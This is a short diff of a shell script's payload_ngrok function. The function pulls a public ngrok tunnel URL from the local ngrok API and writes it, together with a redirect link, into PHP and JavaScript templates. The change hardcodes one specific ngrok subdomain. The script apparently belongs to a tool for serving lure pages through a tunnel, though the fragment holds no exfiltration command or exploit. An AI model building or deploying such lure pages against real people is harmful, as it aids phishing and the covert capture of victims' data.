@@ -122,7 +122,7 @@ printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $s
 
 payload_ngrok() {
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://VK.cimqu.ngrok.io")
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 sed 's+redirect_link+'$redirect_link'+g' js/_app.js > js/app.js
 
